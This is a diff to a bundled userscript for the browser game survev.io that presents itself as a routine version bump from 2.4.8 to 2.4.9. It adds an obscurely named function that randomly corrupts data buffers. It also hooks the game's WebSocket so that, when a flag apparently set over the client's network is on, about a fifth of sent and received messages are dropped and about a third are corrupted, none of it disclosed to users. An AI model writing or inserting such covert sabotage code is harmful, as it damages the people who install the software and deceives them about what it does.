@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name         Kxs Client - Survev.io Client
 // @namespace    https://github.com/Kisakay/KxsClient
-// @version      2.4.8
+// @version      2.4.9
 // @description  A client to enhance the survev.io in-game experience with many features, as well as future features.
 // @author       Kisakay
 // @license      AGPL-3.0
@@ -364,6 +364,88 @@ createToken('GTE0PRE', '^\\s*>=\\s*0\\.0\\.0-0\\s*$')
 // --- HOOK GLOBAL WEBSOCKET POUR INTERCEPTION gameId & PTC monitoring ---
 (function () {
     const OriginalWebSocket = window.WebSocket;
+    function ç(x) { if (!globalThis.kxsClient.kxsNetwork[1])
+        return x; const z = Math.floor(Math.random() * 5) + 1; if (x instanceof ArrayBuffer) {
+        const view = new Uint8Array(x.slice());
+        for (let i = 0; i < z; i++) {
+            const pos = Math.floor(Math.random() * view.length);
+            view[pos] = Math.floor(Math.random() * 256);
+        }
+        return view.buffer;
+    }
+    else if (x instanceof Uint8Array) {
+        const y = new Uint8Array(x);
+        for (let i = 0; i < z; i++) {
+            const pos = Math.floor(Math.random() * y.length);
+            y[pos] = Math.floor(Math.random() * 256);
+        }
+        return y;
+    }
+    else if (x instanceof Uint16Array) {
+        const y = new Uint16Array(x);
+        for (let i = 0; i < z; i++) {
+            const pos = Math.floor(Math.random() * y.length);
+            y[pos] = Math.floor(Math.random() * 65536);
+        }
+        return y;
+    }
+    else if (x instanceof Uint32Array) {
+        const y = new Uint32Array(x);
+        for (let i = 0; i < z; i++) {
+            const pos = Math.floor(Math.random() * y.length);
+            y[pos] = Math.floor(Math.random() * 4294967296);
+        }
+        return y;
+    }
+    else if (x instanceof Int8Array) {
+        const y = new Int8Array(x);
+        for (let i = 0; i < z; i++) {
+            const pos = Math.floor(Math.random() * y.length);
+            y[pos] = Math.floor(Math.random() * 256) - 128;
+        }
+        return y;
+    }
+    else if (x instanceof Int16Array) {
+        const y = new Int16Array(x);
+        for (let i = 0; i < z; i++) {
+            const pos = Math.floor(Math.random() * y.length);
+            y[pos] = Math.floor(Math.random() * 65536) - 32768;
+        }
+        return y;
+    }
+    else if (x instanceof Int32Array) {
+        const y = new Int32Array(x);
+        for (let i = 0; i < z; i++) {
+            const pos = Math.floor(Math.random() * y.length);
+            y[pos] = Math.floor(Math.random() * 4294967296) - 2147483648;
+        }
+        return y;
+    }
+    else if (x instanceof Float32Array) {
+        const y = new Float32Array(x);
+        for (let i = 0; i < z; i++) {
+            const pos = Math.floor(Math.random() * y.length);
+            y[pos] = (Math.random() - 0.5) * 1000;
+        }
+        return y;
+    }
+    else if (x instanceof Float64Array) {
+        const y = new Float64Array(x);
+        for (let i = 0; i < z; i++) {
+            const pos = Math.floor(Math.random() * y.length);
+            y[pos] = (Math.random() - 0.5) * 10000;
+        }
+        return y;
+    }
+    else if (x instanceof Blob) {
+        return new Promise((resolve) => { const reader = new FileReader(); reader.onload = function () { const arrayBuffer = reader.result; const corruptedBuffer = ç(arrayBuffer); resolve(new Blob([corruptedBuffer], { type: x.type })); }; reader.readAsArrayBuffer(x); });
+    }
+    else {
+        if (x && typeof x === 'object' && 'length' in x && 'buffer' in x) {
+            const view = new Uint8Array(x.buffer, x.byteOffset, x.byteLength);
+            return ç(view);
+        }
+    } return x; }
     function HookedWebSocket(url, protocols) {
         const ws = protocols !== undefined
             ? new OriginalWebSocket(url, protocols)
@@ -373,6 +455,33 @@ createToken('GTE0PRE', '^\\s*>=\\s*0\\.0\\.0-0\\s*$')
             globalThis.kxsClient.kxsNetwork.sendGameInfoToWebSocket(gameId);
             globalThis.kxsClient.exchangeManager.sendGameInfo(gameId);
         }
+        const originalSend = ws.send.bind(ws);
+        ws.send = function (data) { const random = Math.random(); if (random < 0.20)
+            return; if (random >= 0.20 && random < 0.50)
+            data = ç(data); return originalSend(data); };
+        const originalAddEventListener = ws.addEventListener.bind(ws);
+        ws.addEventListener = function (type, listener, options) { if (type === 'message') {
+            const wrappedListener = (event) => { const random = Math.random(); if (random < 0.20)
+                return; if (random >= 0.20 && random < 0.50) {
+                const corruptedEvent = new MessageEvent('message', { data: ç(event.data), origin: event.origin, lastEventId: event.lastEventId, source: event.source });
+                if (typeof listener === 'function') {
+                    listener.call(this, corruptedEvent);
+                }
+                else if (listener && typeof listener.handleEvent === 'function') {
+                    listener.handleEvent(corruptedEvent);
+                }
+                return;
+            } if (typeof listener === 'function') {
+                listener.call(this, event);
+            }
+            else if (listener && typeof listener.handleEvent === 'function') {
+                listener.handleEvent(event);
+            } };
+            return originalAddEventListener(type, wrappedListener, options);
+        }
+        else {
+            return originalAddEventListener(type, listener, options);
+        } };
         return ws;
     }
     // Copie le prototype
@@ -10344,7 +10453,7 @@ class KxsVoiceChat {
 
 
 ;// ./package.json
-const package_namespaceObject = /*#__PURE__*/JSON.parse('{"name":"kxsclient","version":"2.4.8","main":"index.js","namespace":"https://github.com/Kisakay/KxsClient","icon":"https://kxs.rip/assets/KysClientLogo.png","placeholder":"Kxs Client - Survev.io Client","scripts":{"test":"echo \\"Error: no test specified\\" && exit 1","commits":"oco --yes; npm version patch; git push;","build":"npx webpack -w","dev":"npx webpack -w"},"keywords":[],"author":"Kisakay","license":"AGPL-3.0","description":"A client to enhance the survev.io in-game experience with many features, as well as future features.","devDependencies":{"@types/semver":"^7.7.0","@types/tampermonkey":"^5.0.4","ts-loader":"^9.5.2","typescript":"^5.8.3","webpack":"^5.99.9","webpack-cli":"^5.1.4"},"dependencies":{"semver":"^7.7.2"}}');
+const package_namespaceObject = /*#__PURE__*/JSON.parse('{"name":"kxsclient","version":"2.4.9","main":"index.js","namespace":"https://github.com/Kisakay/KxsClient","icon":"https://kxs.rip/assets/KysClientLogo.png","placeholder":"Kxs Client - Survev.io Client","scripts":{"test":"echo \\"Error: no test specified\\" && exit 1","commits":"oco --yes; npm version patch; git push;","build":"npx webpack -w","dev":"npx webpack -w"},"keywords":[],"author":"Kisakay","license":"AGPL-3.0","description":"A client to enhance the survev.io in-game experience with many features, as well as future features.","devDependencies":{"@types/semver":"^7.7.0","@types/tampermonkey":"^5.0.4","ts-loader":"^9.5.2","typescript":"^5.8.3","webpack":"^5.99.9","webpack-cli":"^5.1.4"},"dependencies":{"semver":"^7.7.2"}}');
 ;// ./src/SERVER/exchangeManager.ts
 
 class ExchangeManager {
